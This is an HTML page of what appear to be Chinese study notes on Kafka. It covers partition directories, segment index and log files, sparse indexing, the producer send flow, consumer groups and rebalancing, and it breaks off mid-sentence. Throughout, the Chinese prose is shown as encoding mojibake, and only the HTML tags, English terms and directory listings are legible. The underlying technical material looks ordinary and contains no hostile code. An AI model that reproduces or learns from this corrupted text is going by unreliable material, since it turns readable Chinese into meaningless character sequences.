<p><strong>é¦–å…ˆåº”è¯¥çŸ¥é“ Kafka çš„æ¶ˆæ¯æ˜¯å­˜åœ¨äºæ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šçš„</strong>ã€‚Kafka é«˜åº¦ä¾èµ–æ–‡ä»¶ç³»ç»Ÿæ¥å­˜å‚¨å’Œç¼“å­˜æ¶ˆæ¯ï¼Œä¸€èˆ¬çš„äººè®¤ä¸º â€œç£ç›˜æ˜¯ç¼“æ…¢çš„â€ï¼Œæ‰€ä»¥å¯¹è¿™æ ·çš„è®¾è®¡æŒæœ‰æ€€ç–‘æ€åº¦ã€‚å®é™…ä¸Šï¼Œç£ç›˜æ¯”äººä»¬é¢„æƒ³çš„å¿«å¾ˆå¤šä¹Ÿæ…¢å¾ˆå¤šï¼Œè¿™å–å†³äºå®ƒä»¬å¦‚ä½•è¢«ä½¿ç”¨ï¼›ä¸€ä¸ªå¥½çš„ç£ç›˜ç»“æ„è®¾è®¡å¯ä»¥ä½¿ä¹‹è·Ÿç½‘ç»œé€Ÿåº¦ä¸€æ ·å¿«ã€‚</p>
<p>ç°ä»£çš„æ“ä½œç³»ç»Ÿé’ˆå¯¹ç£ç›˜çš„è¯»å†™å·²ç»åšäº†ä¸€äº›ä¼˜åŒ–æ–¹æ¡ˆæ¥åŠ å¿«ç£ç›˜çš„è®¿é—®é€Ÿåº¦ã€‚æ¯”å¦‚ï¼Œ<strong>é¢„è¯»</strong>ä¼šæå‰å°†ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç£ç›˜å¿«è¯»å…¥å†…å­˜ã€‚<strong>åå†™</strong>ä¼šå°†å¾ˆå¤šå°çš„é€»è¾‘å†™æ“ä½œåˆå¹¶èµ·æ¥ç»„åˆæˆä¸€ä¸ªå¤§çš„ç‰©ç†å†™æ“ä½œã€‚å¹¶ä¸”ï¼Œæ“ä½œç³»ç»Ÿè¿˜ä¼šå°†ä¸»å†…å­˜å‰©ä½™çš„æ‰€æœ‰ç©ºé—²å†…å­˜ç©ºé—´éƒ½ç”¨ä½œ<strong>ç£ç›˜ç¼“å­˜</strong>ï¼Œæ‰€æœ‰çš„ç£ç›˜è¯»å†™æ“ä½œéƒ½ä¼šç»è¿‡ç»Ÿä¸€çš„ç£ç›˜ç¼“å­˜ï¼ˆé™¤äº†ç›´æ¥ I/O ä¼šç»•è¿‡ç£ç›˜ç¼“å­˜ï¼‰ã€‚ç»¼åˆè¿™å‡ ç‚¹ä¼˜åŒ–ç‰¹ç‚¹ï¼Œ<strong>å¦‚æœæ˜¯é’ˆå¯¹ç£ç›˜çš„é¡ºåºè®¿é—®ï¼ŒæŸäº›æƒ…å†µä¸‹å®ƒå¯èƒ½æ¯”éšæœºçš„å†…å­˜è®¿é—®éƒ½è¦å¿«ï¼Œç”šè‡³å¯ä»¥å’Œç½‘ç»œçš„é€Ÿåº¦ç›¸å·®æ— å‡ ã€‚</strong></p>
<p><strong>ä¸Šè¿°çš„ Topic å…¶å®æ˜¯é€»è¾‘ä¸Šçš„æ¦‚å¿µï¼Œé¢ç›¸æ¶ˆè´¹è€…å’Œç”Ÿäº§è€…ï¼Œç‰©ç†ä¸Šå­˜å‚¨çš„å…¶å®æ˜¯ Partition</strong>ï¼Œæ¯ä¸€ä¸ª Partition æœ€ç»ˆå¯¹åº”ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢å­˜å‚¨æ‰€æœ‰çš„æ¶ˆæ¯å’Œç´¢å¼•æ–‡ä»¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸€ä¸ª Topic åœ¨åˆ›å»ºæ—¶å¦‚æœä¸æŒ‡å®š Partition æ•°é‡æ—¶åªä¼šåˆ›å»º 1 ä¸ª Partitionã€‚æ¯”å¦‚ï¼Œæˆ‘åˆ›å»ºäº†ä¸€ä¸ª Topic åå­—ä¸º test ï¼Œæ²¡æœ‰æŒ‡å®š Partition çš„æ•°é‡ï¼Œé‚£ä¹ˆä¼šé»˜è®¤åˆ›å»ºä¸€ä¸ª test-0 çš„æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œçš„å‘½åè§„åˆ™æ˜¯ï¼š<code>&lt;topic_name&gt;-&lt;partition_id&gt;</code>ã€‚</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-æ–‡ä»¶ç³»ç»Ÿå­˜å‚¨.png" alt="" loading="lazy"></p>
<p>ä»»ä½•å‘å¸ƒåˆ° Partition çš„æ¶ˆæ¯éƒ½ä¼šè¢«è¿½åŠ åˆ° Partition æ•°æ®æ–‡ä»¶çš„å°¾éƒ¨ï¼Œè¿™æ ·çš„é¡ºåºå†™ç£ç›˜æ“ä½œè®© Kafka çš„æ•ˆç‡éå¸¸é«˜ï¼ˆç»éªŒè¯ï¼Œé¡ºåºå†™ç£ç›˜æ•ˆç‡æ¯”éšæœºå†™å†…å­˜è¿˜è¦é«˜ï¼Œè¿™æ˜¯ Kafka é«˜ååç‡çš„ä¸€ä¸ªå¾ˆé‡è¦çš„ä¿è¯ï¼‰ã€‚</p>
<p>æ¯ä¸€æ¡æ¶ˆæ¯è¢«å‘é€åˆ° Broker ä¸­ï¼Œä¼šæ ¹æ® Partition è§„åˆ™é€‰æ‹©è¢«å­˜å‚¨åˆ°å“ªä¸€ä¸ª Partitionã€‚å¦‚æœ Partition è§„åˆ™è®¾ç½®çš„åˆç†ï¼Œæ‰€æœ‰æ¶ˆæ¯å¯ä»¥å‡åŒ€åˆ†å¸ƒåˆ°ä¸åŒçš„ Partitionä¸­ã€‚</p>
<h3 id="åº•å±‚å­˜å‚¨è®¾è®¡" tabindex="-1"> åº•å±‚å­˜å‚¨è®¾è®¡</h3>
<p>å‡è®¾ç°åœ¨ Kafka é›†ç¾¤åªæœ‰ä¸€ä¸ª Brokerï¼Œæˆ‘ä»¬åˆ›å»º 2 ä¸ª Topic åç§°åˆ†åˆ«ä¸ºï¼šã€Œtopic1ã€å’Œã€Œtopic2ã€ï¼ŒPartition æ•°é‡åˆ†åˆ«ä¸º 1ã€2ï¼Œé‚£ä¹ˆæ ¹ç›®å½•ä¸‹å°±ä¼šåˆ›å»ºå¦‚ä¸‹ä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼š</p>
<div><pre><code>    <span>|</span> --topic1-0
    <span>|</span> --topic2-0
    <span>|</span> --topic2-1
</code></pre></div><p>åœ¨ Kafka çš„æ–‡ä»¶å­˜å‚¨ä¸­ï¼ŒåŒä¸€ä¸ª Topic ä¸‹æœ‰å¤šä¸ªä¸åŒçš„ Partitionï¼Œæ¯ä¸ª Partition éƒ½ä¸ºä¸€ä¸ªç›®å½•ï¼Œè€Œæ¯ä¸€ä¸ªç›®å½•åˆè¢«å¹³å‡åˆ†é…æˆå¤šä¸ªå¤§å°ç›¸ç­‰çš„ <strong>Segment File</strong> ä¸­ï¼ŒSegment File åˆç”± index file å’Œ data file ç»„æˆï¼Œä»–ä»¬æ€»æ˜¯æˆå¯¹å‡ºç°ï¼Œåç¼€ â€œ.indexâ€ å’Œ â€œ.logâ€ åˆ†è¡¨è¡¨ç¤º Segment ç´¢å¼•æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶ã€‚</p>
<p>ç°åœ¨å‡è®¾è®¾ç½®æ¯ä¸ª Segment å¤§å°ä¸º 500 MBï¼Œå¹¶å¯åŠ¨ç”Ÿäº§è€…å‘ topic1 ä¸­å†™å…¥å¤§é‡æ•°æ®ï¼Œtopic1-0 æ–‡ä»¶å¤¹ä¸­å°±ä¼šäº§ç”Ÿç±»ä¼¼å¦‚ä¸‹çš„ä¸€äº›æ–‡ä»¶ï¼š</p>
<div><pre><code>   <span>|</span> --topic1-0 
       <span>|</span> --00000000000000000000.index 
       <span>|</span> --00000000000000000000.log 
       <span>|</span> --00000000000000368769.index 
       <span>|</span> --00000000000000368769.log 
       <span>|</span> --00000000000000737337.index 
       <span>|</span> --00000000000000737337.log 
       <span>|</span> --00000000000001105814.index <span>|</span> --00000000000001105814.log 
   <span>|</span> --topic2-0 
   <span>|</span> --topic2-1

</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><p>**Segment æ˜¯ Kafka æ–‡ä»¶å­˜å‚¨çš„æœ€å°å•ä½ã€‚**Segment æ–‡ä»¶å‘½åè§„åˆ™ï¼šPartition å…¨å±€çš„ç¬¬ä¸€ä¸ª Segment ä» 0 å¼€å§‹ï¼Œåç»­æ¯ä¸ª Segment æ–‡ä»¶åä¸ºä¸Šä¸€ä¸ª Segment æ–‡ä»¶æœ€åä¸€æ¡æ¶ˆæ¯çš„ offset å€¼ã€‚æ•°å€¼æœ€å¤§ä¸º 64 ä½ long å¤§å°ï¼Œ19 ä½æ•°å­—å­—ç¬¦é•¿åº¦ï¼Œæ²¡æœ‰æ•°å­—ç”¨0å¡«å……ã€‚å¦‚ 00000000000000368769.index å’Œ 00000000000000368769.logã€‚</p>
<p>ä»¥ä¸Šé¢çš„ä¸€å¯¹ Segment File ä¸ºä¾‹ï¼Œè¯´æ˜ä¸€ä¸‹ç´¢å¼•æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶å¯¹åº”å…³ç³»ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-segmentå­˜å‚¨å•ä½.png" alt="ç´¢å¼•æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶" loading="lazy"></p>
<p>å…¶ä¸­ä»¥ç´¢å¼•æ–‡ä»¶ä¸­å…ƒæ•°æ® <code>&lt;3, 497&gt;</code> ä¸ºä¾‹ï¼Œä¾æ¬¡åœ¨æ•°æ®æ–‡ä»¶ä¸­è¡¨ç¤ºç¬¬ 3 ä¸ª messageï¼ˆåœ¨å…¨å±€ Partition è¡¨ç¤ºç¬¬ 368769 + 3 = 368772 ä¸ª messageï¼‰ä»¥åŠè¯¥æ¶ˆæ¯çš„ç‰©ç†åç§»åœ°å€ä¸º 497ã€‚</p>
<p>æ³¨æ„è¯¥ index æ–‡ä»¶å¹¶ä¸æ˜¯ä»0å¼€å§‹ï¼Œä¹Ÿä¸æ˜¯æ¯æ¬¡é€’å¢1çš„ï¼Œè¿™æ˜¯å› ä¸º Kafka é‡‡å–ç¨€ç–ç´¢å¼•å­˜å‚¨çš„æ–¹å¼ï¼Œæ¯éš”ä¸€å®šå­—èŠ‚çš„æ•°æ®å»ºç«‹ä¸€æ¡ç´¢å¼•ï¼Œå®ƒå‡å°‘äº†ç´¢å¼•æ–‡ä»¶å¤§å°ï¼Œä½¿å¾—èƒ½å¤ŸæŠŠ index æ˜ å°„åˆ°å†…å­˜ï¼Œé™ä½äº†æŸ¥è¯¢æ—¶çš„ç£ç›˜ IO å¼€é”€ï¼ŒåŒæ—¶ä¹Ÿå¹¶æ²¡æœ‰ç»™æŸ¥è¯¢å¸¦æ¥å¤ªå¤šçš„æ—¶é—´æ¶ˆè€—ã€‚</p>
<p>å› ä¸ºå…¶æ–‡ä»¶åä¸ºä¸Šä¸€ä¸ª Segment æœ€åä¸€æ¡æ¶ˆæ¯çš„ offset ï¼Œæ‰€ä»¥å½“éœ€è¦æŸ¥æ‰¾ä¸€ä¸ªæŒ‡å®š offset çš„ message æ—¶ï¼Œé€šè¿‡åœ¨æ‰€æœ‰ segment çš„æ–‡ä»¶åä¸­è¿›è¡ŒäºŒåˆ†æŸ¥æ‰¾å°±èƒ½æ‰¾åˆ°å®ƒå½’å±çš„ segment ï¼Œå†åœ¨å…¶ index æ–‡ä»¶ä¸­æ‰¾åˆ°å…¶å¯¹åº”åˆ°æ–‡ä»¶ä¸Šçš„ç‰©ç†ä½ç½®ï¼Œå°±èƒ½æ‹¿å‡ºè¯¥ message ã€‚</p>
<p>ç”±äºæ¶ˆæ¯åœ¨ Partition çš„ Segment æ•°æ®æ–‡ä»¶ä¸­æ˜¯é¡ºåºè¯»å†™çš„ï¼Œä¸”æ¶ˆæ¯æ¶ˆè´¹åä¸ä¼šåˆ é™¤ï¼ˆåˆ é™¤ç­–ç•¥æ˜¯é’ˆå¯¹è¿‡æœŸçš„ Segment æ–‡ä»¶ï¼‰ï¼Œè¿™ç§é¡ºåºç£ç›˜ IO å­˜å‚¨è®¾è®¡å¸ˆ Kafka é«˜æ€§èƒ½å¾ˆé‡è¦çš„åŸå› ã€‚</p>
<blockquote>
<p>Kafka æ˜¯å¦‚ä½•å‡†ç¡®çš„çŸ¥é“ message çš„åç§»çš„å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨ Kafka å®šä¹‰äº†æ ‡å‡†çš„æ•°æ®å­˜å‚¨ç»“æ„ï¼Œåœ¨ Partition ä¸­çš„æ¯ä¸€æ¡ message éƒ½åŒ…å«äº†ä»¥ä¸‹ä¸‰ä¸ªå±æ€§ï¼š</p>
<ul>
<li>offsetï¼šè¡¨ç¤º message åœ¨å½“å‰ Partition ä¸­çš„åç§»é‡ï¼Œæ˜¯ä¸€ä¸ªé€»è¾‘ä¸Šçš„å€¼ï¼Œå”¯ä¸€ç¡®å®šäº† Partition ä¸­çš„ä¸€æ¡ messageï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºæ˜¯ä¸€ä¸ª idï¼›</li>
<li>MessageSizeï¼šè¡¨ç¤º message å†…å®¹ data çš„å¤§å°ï¼›</li>
<li>dataï¼šmessage çš„å…·ä½“å†…å®¹</li>
</ul>
</blockquote>
<h2 id="ç”Ÿäº§è€…è®¾è®¡" tabindex="-1"> ç”Ÿäº§è€…è®¾è®¡</h2>
<p>å½“å‘é€æ¶ˆæ¯ä¹‹å‰ï¼Œå…ˆé—®å‡ ä¸ªé—®é¢˜ï¼šæ¯æ¡æ¶ˆæ¯éƒ½æ˜¯å¾ˆå…³é”®ä¸”ä¸èƒ½å®¹å¿ä¸¢å¤±ä¹ˆï¼Ÿå¶å°”é‡å¤æ¶ˆæ¯å¯ä»¥ä¹ˆï¼Ÿå…³æ³¨çš„æ˜¯æ¶ˆæ¯å»¶è¿Ÿè¿˜æ˜¯å†™å…¥æ¶ˆæ¯çš„ååé‡ï¼Ÿ</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œæœ‰ä¸€ä¸ªä¿¡ç”¨å¡äº¤æ˜“å¤„ç†ç³»ç»Ÿï¼Œå½“äº¤æ˜“å‘ç”Ÿæ—¶ä¼šå‘é€ä¸€æ¡æ¶ˆæ¯åˆ° Kafkaï¼Œå¦ä¸€ä¸ªæœåŠ¡æ¥è¯»å–æ¶ˆæ¯å¹¶æ ¹æ®è§„åˆ™å¼•æ“æ¥æ£€æŸ¥äº¤æ˜“æ˜¯å¦é€šè¿‡ï¼Œå°†ç»“æœé€šè¿‡ Kafka è¿”å›ã€‚å¯¹äºè¿™æ ·çš„ä¸šåŠ¡ï¼Œæ¶ˆæ¯æ—¢ä¸èƒ½ä¸¢å¤±ä¹Ÿä¸èƒ½é‡å¤ï¼Œç”±äºäº¤æ˜“é‡å¤§å› æ­¤ååé‡éœ€è¦å°½å¯èƒ½å¤§ï¼Œå»¶è¿Ÿå¯ä»¥ç¨å¾®é«˜ä¸€ç‚¹ã€‚</p>
<p>å†ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚æˆ‘ä»¬éœ€è¦æ”¶é›†ç”¨æˆ·åœ¨ç½‘é¡µä¸Šçš„ç‚¹å‡»æ•°æ®ï¼Œå¯¹äºè¿™æ ·çš„åœºæ™¯ï¼Œå°‘é‡æ¶ˆæ¯ä¸¢å¤±æˆ–è€…é‡å¤æ˜¯å¯ä»¥å®¹å¿çš„ï¼Œå»¶è¿Ÿå¤šå¤§éƒ½ä¸é‡è¦åªè¦ä¸å½±å“ç”¨æˆ·ä½“éªŒï¼Œåååˆ™æ ¹æ®å®æ—¶ç”¨æˆ·æ•°æ¥å†³å®šã€‚</p>
<p>ä¸åŒçš„ä¸šåŠ¡éœ€è¦ä½¿ç”¨ä¸åŒçš„å†™å…¥æ–¹å¼å’Œé…ç½®ã€‚å…·ä½“çš„æ–¹å¼åœ¨è¿™é‡Œä¸åšè®¨è®ºï¼Œç°åœ¨å…ˆçœ‹ä¸‹ç”Ÿäº§è€…å†™æ¶ˆæ¯çš„åŸºæœ¬æµç¨‹ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-ç”Ÿäº§è€…è®¾è®¡.png" alt="ç”Ÿäº§è€…è®¾è®¡" loading="lazy"></p>
<p>æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªProducerRecordï¼Œè¿™ä¸ªå¯¹è±¡éœ€è¦åŒ…å«æ¶ˆæ¯çš„ä¸»é¢˜ï¼ˆtopicï¼‰å’Œå€¼ï¼ˆvalueï¼‰ï¼Œå¯ä»¥é€‰æ‹©æ€§æŒ‡å®šä¸€ä¸ªé”®å€¼ï¼ˆkeyï¼‰æˆ–è€…åˆ†åŒºï¼ˆpartitionï¼‰ã€‚</li>
<li>å‘é€æ¶ˆæ¯æ—¶ï¼Œç”Ÿäº§è€…ä¼šå¯¹é”®å€¼å’Œå€¼åºåˆ—åŒ–æˆå­—èŠ‚æ•°ç»„ï¼Œç„¶åå‘é€åˆ°åˆ†é…å™¨ï¼ˆpartitionerï¼‰ã€‚</li>
<li>å¦‚æœæˆ‘ä»¬æŒ‡å®šäº†åˆ†åŒºï¼Œé‚£ä¹ˆåˆ†é…å™¨è¿”å›è¯¥åˆ†åŒºå³å¯ï¼›å¦åˆ™ï¼Œåˆ†é…å™¨å°†ä¼šåŸºäºé”®å€¼æ¥é€‰æ‹©ä¸€ä¸ªåˆ†åŒºå¹¶è¿”å›ã€‚</li>
<li>é€‰æ‹©å®Œåˆ†åŒºåï¼Œç”Ÿäº§è€…çŸ¥é“äº†æ¶ˆæ¯æ‰€å±çš„ä¸»é¢˜å’Œåˆ†åŒºï¼Œå®ƒå°†è¿™æ¡è®°å½•æ·»åŠ åˆ°ç›¸åŒä¸»é¢˜å’Œåˆ†åŒºçš„æ‰¹é‡æ¶ˆæ¯ä¸­ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è´Ÿè´£å‘é€è¿™äº›æ‰¹é‡æ¶ˆæ¯åˆ°å¯¹åº”çš„Kafka brokerã€‚</li>
<li>å½“brokeræ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œå¦‚æœæˆåŠŸå†™å…¥åˆ™è¿”å›ä¸€ä¸ªåŒ…å«æ¶ˆæ¯çš„ä¸»é¢˜ã€åˆ†åŒºåŠä½ç§»çš„RecordMetadataå¯¹è±¡ï¼Œå¦åˆ™è¿”å›å¼‚å¸¸ã€‚</li>
<li>ç”Ÿäº§è€…æ¥æ”¶åˆ°ç»“æœåï¼Œå¯¹äºå¼‚å¸¸å¯èƒ½ä¼šè¿›è¡Œé‡è¯•ã€‚</li>
</ol>
<h2 id="æ¶ˆè´¹è€…è®¾è®¡" tabindex="-1"> æ¶ˆè´¹è€…è®¾è®¡</h2>
<h3 id="æ¶ˆè´¹è€…å’Œæ¶ˆè´¹è€…ç»„" tabindex="-1"> æ¶ˆè´¹è€…å’Œæ¶ˆè´¹è€…ç»„</h3>
<p>å‡è®¾åœºæ™¯ï¼šä»Kafkaä¸­è¯»å–æ¶ˆæ¯ï¼Œå¹¶ä¸”è¿›è¡Œæ£€æŸ¥ï¼Œæœ€åäº§ç”Ÿç»“æœæ•°æ®ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶ˆè´¹è€…å®ä¾‹å»åšè¿™ä»¶äº‹æƒ…ï¼Œä½†å¦‚æœç”Ÿäº§è€…å†™å…¥æ¶ˆæ¯çš„é€Ÿåº¦æ¯”æ¶ˆè´¹è€…è¯»å–çš„é€Ÿåº¦å¿«æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™æ ·éšç€æ—¶é—´å¢é•¿ï¼Œæ¶ˆæ¯å †ç§¯è¶Šæ¥è¶Šä¸¥é‡ã€‚å¯¹äºè¿™ç§åœºæ™¯ï¼Œéœ€è¦å¢åŠ å¤šä¸ªæ¶ˆè´¹è€…æ¥è¿›è¡Œæ°´å¹³æ‰©å±•ã€‚</p>
<p>Kafkaæ¶ˆè´¹è€…æ˜¯<strong>æ¶ˆè´¹ç»„</strong>çš„ä¸€éƒ¨åˆ†ï¼Œå½“å¤šä¸ªæ¶ˆè´¹è€…å½¢æˆä¸€ä¸ªæ¶ˆè´¹ç»„æ¥æ¶ˆè´¹ä¸»é¢˜æ—¶ï¼Œæ¯ä¸ªæ¶ˆè´¹è€…ä¼šæ”¶åˆ°ä¸åŒåˆ†åŒºçš„æ¶ˆæ¯ã€‚å‡è®¾æœ‰ä¸€ä¸ªT1ä¸»é¢˜ï¼Œè¯¥ä¸»é¢˜æœ‰4ä¸ªåˆ†åŒºï¼›åŒæ—¶æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¶ˆè´¹ç»„G1ï¼Œè¿™ä¸ªæ¶ˆè´¹ç»„åªæœ‰ä¸€ä¸ªæ¶ˆè´¹è€…C1ã€‚é‚£ä¹ˆæ¶ˆè´¹è€…C1å°†ä¼šæ”¶åˆ°è¿™4ä¸ªåˆ†åŒºçš„æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-æ¶ˆè´¹è€…è®¾è®¡-1.png" alt="" loading="lazy"></p>
<p>å¦‚æœæˆ‘ä»¬å¢åŠ æ–°çš„æ¶ˆè´¹è€…C2åˆ°æ¶ˆè´¹ç»„G1ï¼Œé‚£ä¹ˆæ¯ä¸ªæ¶ˆè´¹è€…å°†ä¼šåˆ†åˆ«æ”¶åˆ°ä¸¤ä¸ªåˆ†åŒºçš„æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-æ¶ˆè´¹è€…è®¾è®¡-2.png" alt="" loading="lazy"></p>
<p>å¦‚æœå¢åŠ åˆ°4ä¸ªæ¶ˆè´¹è€…ï¼Œé‚£ä¹ˆæ¯ä¸ªæ¶ˆè´¹è€…å°†ä¼šåˆ†åˆ«æ”¶åˆ°ä¸€ä¸ªåˆ†åŒºçš„æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-æ¶ˆè´¹è€…è®¾è®¡-3.png" alt="" loading="lazy"></p>
<p>ä½†å¦‚æœæˆ‘ä»¬ç»§ç»­å¢åŠ æ¶ˆè´¹è€…åˆ°è¿™ä¸ªæ¶ˆè´¹ç»„ï¼Œå‰©ä½™çš„æ¶ˆè´¹è€…å°†ä¼šç©ºé—²ï¼Œä¸ä¼šæ”¶åˆ°ä»»ä½•æ¶ˆæ¯ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-æ¶ˆè´¹è€…è®¾è®¡-4.png" alt="" loading="lazy"></p>
<p>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ æ¶ˆè´¹ç»„çš„æ¶ˆè´¹è€…æ¥è¿›è¡Œæ°´å¹³æ‰©å±•æå‡æ¶ˆè´¹èƒ½åŠ›ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå»ºè®®åˆ›å»ºä¸»é¢˜æ—¶ä½¿ç”¨æ¯”è¾ƒå¤šçš„åˆ†åŒºæ•°ï¼Œè¿™æ ·å¯ä»¥åœ¨æ¶ˆè´¹è´Ÿè½½é«˜çš„æƒ…å†µä¸‹å¢åŠ æ¶ˆè´¹è€…æ¥æå‡æ€§èƒ½ã€‚å¦å¤–ï¼Œæ¶ˆè´¹è€…çš„æ•°é‡ä¸åº”è¯¥æ¯”åˆ†åŒºæ•°å¤šï¼Œå› ä¸ºå¤šå‡ºæ¥çš„æ¶ˆè´¹è€…æ˜¯ç©ºé—²çš„ï¼Œæ²¡æœ‰ä»»ä½•å¸®åŠ©ã€‚</p>
<p>**Kafkaä¸€ä¸ªå¾ˆé‡è¦çš„ç‰¹æ€§å°±æ˜¯ï¼Œåªéœ€å†™å…¥ä¸€æ¬¡æ¶ˆæ¯ï¼Œå¯ä»¥æ”¯æŒä»»æ„å¤šçš„åº”ç”¨è¯»å–è¿™ä¸ªæ¶ˆæ¯ã€‚**æ¢å¥è¯è¯´ï¼Œæ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥è¯»åˆ°å…¨é‡çš„æ¶ˆæ¯ã€‚ä¸ºäº†ä½¿å¾—æ¯ä¸ªåº”ç”¨éƒ½èƒ½è¯»åˆ°å…¨é‡æ¶ˆæ¯ï¼Œåº”ç”¨éœ€è¦æœ‰ä¸åŒçš„æ¶ˆè´¹ç»„ã€‚å¯¹äºä¸Šé¢çš„ä¾‹å­ï¼Œå‡å¦‚æˆ‘ä»¬æ–°å¢äº†ä¸€ä¸ªæ–°çš„æ¶ˆè´¹ç»„G2ï¼Œè€Œè¿™ä¸ªæ¶ˆè´¹ç»„æœ‰ä¸¤ä¸ªæ¶ˆè´¹è€…ï¼Œé‚£ä¹ˆä¼šæ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-æ¶ˆè´¹è€…è®¾è®¡-5.png" alt="" loading="lazy"></p>
<p>åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæ¶ˆè´¹ç»„G1å’Œæ¶ˆè´¹ç»„G2éƒ½èƒ½æ”¶åˆ°T1ä¸»é¢˜çš„å…¨é‡æ¶ˆæ¯ï¼Œåœ¨é€»è¾‘æ„ä¹‰ä¸Šæ¥è¯´å®ƒä»¬å±äºä¸åŒçš„åº”ç”¨ã€‚</p>
<p>æœ€åï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼šå¦‚æœåº”ç”¨éœ€è¦è¯»å–å…¨é‡æ¶ˆæ¯ï¼Œé‚£ä¹ˆè¯·ä¸ºè¯¥åº”ç”¨è®¾ç½®ä¸€ä¸ªæ¶ˆè´¹ç»„ï¼›å¦‚æœè¯¥åº”ç”¨æ¶ˆè´¹èƒ½åŠ›ä¸è¶³ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘åœ¨è¿™ä¸ªæ¶ˆè´¹ç»„é‡Œå¢åŠ æ¶ˆè´¹è€…ã€‚</p>
<h3 id="æ¶ˆè´¹è€…ç»„ä¸åˆ†åŒºé‡å¹³è¡¡" tabindex="-1"> æ¶ˆè´¹è€…ç»„ä¸åˆ†åŒºé‡å¹³è¡¡</h3>
<p>å½“ä¸€äº›åŸå› å¯¼è‡´consumerå¯¹partitionæ¶ˆè´¹ä¸å†å‡åŒ€æ—¶ï¼Œkafkaä¼šè‡ªåŠ¨æ‰§è¡Œreblanceï¼Œä½¿å¾—consumerå¯¹partitionçš„æ¶ˆè´¹å†æ¬¡å¹³è¡¡ã€‚
ä»€ä¹ˆæ—¶å€™å‘ç”Ÿrebalanceï¼Ÿï¼š</p>
<ul>
<li>ç»„è®¢é˜…topicæ•°å˜æ›´</li>
<li>topic partitionæ•°å˜æ›´</li>
<li>consumeræˆå‘˜å˜æ›´</li>
<li>consumer åŠ å…¥ç¾¤ç»„æˆ–è€…ç¦»å¼€ç¾¤ç»„çš„æ—¶å€™</li>
<li>consumerè¢«æ£€æµ‹ä¸ºå´©æºƒçš„æ—¶å€™</li>
</ul>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå½“æ–°çš„æ¶ˆè´¹è€…åŠ å…¥æ¶ˆè´¹ç»„ï¼Œå®ƒä¼šæ¶ˆè´¹ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†åŒºï¼Œè€Œè¿™äº›åˆ†åŒºä¹‹å‰æ˜¯ç”±å…¶ä»–æ¶ˆè´¹è€…è´Ÿè´£çš„ï¼›å¦å¤–ï¼Œå½“æ¶ˆè´¹è€…ç¦»å¼€æ¶ˆè´¹ç»„ï¼ˆæ¯”å¦‚é‡å¯ã€å®•æœºç­‰ï¼‰æ—¶ï¼Œå®ƒæ‰€æ¶ˆè´¹çš„åˆ†åŒºä¼šåˆ†é…ç»™å…¶ä»–åˆ†åŒºã€‚è¿™ç§ç°è±¡ç§°ä¸º<strong>é‡å¹³è¡¡ï¼ˆrebalanceï¼‰</strong>ã€‚é‡å¹³è¡¡æ˜¯ Kafka ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨ï¼Œè¿™ä¸ªæ€§è´¨ä¿è¯äº†é«˜å¯ç”¨å’Œæ°´å¹³æ‰©å±•ã€‚**ä¸è¿‡ä¹Ÿéœ€è¦æ³¨æ„åˆ°ï¼Œåœ¨é‡å¹³è¡¡æœŸé—´ï¼Œæ‰€æœ‰æ¶ˆè´¹è€…éƒ½ä¸èƒ½æ¶ˆè´¹æ¶ˆæ¯ï¼Œå› æ­¤ä¼šé€ 